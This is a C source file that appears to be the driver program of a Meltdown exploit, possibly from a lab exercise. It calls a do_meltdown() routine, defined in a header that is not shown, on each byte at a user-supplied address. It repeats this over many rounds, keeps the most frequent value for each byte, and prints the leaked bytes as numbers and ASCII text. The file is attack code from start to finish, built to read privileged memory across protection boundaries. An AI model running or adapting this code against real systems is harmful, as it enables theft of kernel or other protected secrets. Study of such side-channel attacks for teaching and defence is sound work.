#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include "solution.h"

static int parse_hex(const char *s, uintptr_t *out) {
    char *end = NULL;
    unsigned long long v = strtoull(s, &end, 16);
    if (s == end || *end != '\0') {
        return -1;
    }
    *out = (uintptr_t)v;
    return 0;
}

static void dump_ascii(const uint8_t *buf, int len) {
    fprintf(stderr, "ASCII: ");
    for (int i = 0; i < len; i++) {
        int c = buf[i];
        if (isprint(c)) {
            fputc(c, stderr);
        } else {
            fputc('.', stderr);
        }
    }
    fputc('\n', stderr);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <addr_hex> <len> <rounds>\n", argv[0]);
        return EXIT_FAILURE;
    }

    uintptr_t base = 0;
    if (parse_hex(argv[1], &base) != 0) {
        fprintf(stderr, "Invalid address: %s\n", argv[1]);
        return EXIT_FAILURE;
    }

    int len = atoi(argv[2]);
    int rounds = atoi(argv[3]);
    if (len <= 0 || rounds <= 0) {
        fprintf(stderr, "Invalid len/rounds\n");
        return EXIT_FAILURE;
    }

    cc_init();

    size_t counts_size = (size_t)len * 256;
    uint32_t *counts = (uint32_t *)calloc(counts_size, sizeof(uint32_t));
    if (!counts) {
        fprintf(stderr, "Failed to allocate counts\n");
        return EXIT_FAILURE;
    }

    for (int r = 0; r < rounds; r++) {
        for (int off = 0; off < len; off++) {
            int val = do_meltdown(base + (uintptr_t)off);
            if (val > 0 && val < 256) {
                counts[(size_t)off * 256 + (size_t)val]++;
            }
        }
    }

    uint8_t *result = (uint8_t *)calloc((size_t)len, 1);
    if (!result) {
        fprintf(stderr, "Failed to allocate result buffer\n");
        free(counts);
        return EXIT_FAILURE;
    }

    for (int off = 0; off < len; off++) {
        int best_val = 0;
        uint32_t best_cnt = 0;
        for (int v = 1; v < 256; v++) {
            uint32_t cnt = counts[(size_t)off * 256 + (size_t)v];
            if (cnt > best_cnt) {
                best_cnt = cnt;
                best_val = v;
            }
        }
        result[off] = (uint8_t)best_val;
        printf("%d %u %u\n", off, (unsigned)best_val, (unsigned)best_cnt);
    }

    if (len > 67) {
        fprintf(stderr, "Offsets 65/66: %c %c\n", result[65], result[66]);
    }
    dump_ascii(result, len);

    free(result);
    free(counts);
    return EXIT_SUCCESS;
}
